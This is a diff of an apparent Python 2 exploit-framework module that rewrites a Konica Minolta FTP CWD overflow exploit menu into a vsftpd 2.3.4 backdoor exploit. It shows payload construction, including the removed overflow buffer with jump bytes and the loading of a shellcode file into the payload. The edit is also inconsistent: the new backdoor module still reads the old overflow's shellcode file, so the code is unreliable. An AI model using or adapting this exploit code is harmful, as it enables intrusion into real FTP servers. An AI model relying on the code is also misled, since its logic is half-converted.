@@ -12,11 +12,9 @@ def getToken(line):
             break
     return token
 
-class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
+class vsftpdBackdoorMenu(cmd.Cmd):
   def __init__(self):
     cmd.Cmd.__init__(self)
-    self.user = ["anonymous"]
-    self.passwd = ["anonymous@example.com"]
     self.host = ["ftp.debian.org"]
   def help_help(self):
     print "Usage: help [cmd]"
@@ -45,15 +43,13 @@ class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
     print "Usage: show options"
     print "show options: show the variables, current values, and descriptions"
   def do_show(self, args):
-    print "Target: Windows 7 SP1 x86"
-    print "Options for konica_minolta_cwd_overflow:"
+    print "Target: Linux with vsftpd v2.3.4"
+    print "Options for vsftpd_backdoor:"
     print "========================"
-    print "user    %s    the user to login in as" % self.user[0]
-    print "passwd    %s    the password of the user" % self.passwd[0]
     print "host    %s    the IP of the target" % self.host[0]
   def help_exit(self):
     print "Usage: exit"
-    print "exit: exit the konica_minolta_cwd_overflow context"
+    print "exit: exit the vsftpd_backdoor context"
   def do_exit(self, args):
     if args:
       print "*** Number of arguments: needed 0"
@@ -66,21 +62,11 @@ class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
     for let in "abcdefghijklmnopqrstuvwxyz":
       if let in self.host[0]:
         self.host[0] = gethostbyname(self.host[0])
-    ftp = ftplib.FTP(self.host[0])
-    try:
-      ftp.login(self.user[0], self.passwd[0])
-      print "[+]Login successful on %s" % self.host[0]
-    except:
-      print "[-]Login unsuccessful on %s" % self.host[0]
-      return
-    ftp.quit()
     print "[*]Generating payload..."
     char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
     payload = ""
-    for a in range(0, 1037):
-      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
-      payload += tmp.decode('string_escape')
-    payload += "\xEB\x06b<\x9Dm \x12"
+    for a in range(0, 7):
+      payload += char[randint(0, 15)] + char[randint(0, 15)]
     f = open("../../../payloads/konica_minolta_cwd.shell", "r")
     for line in f.readlines():
       payload += line[:-1].decode('string_escape')
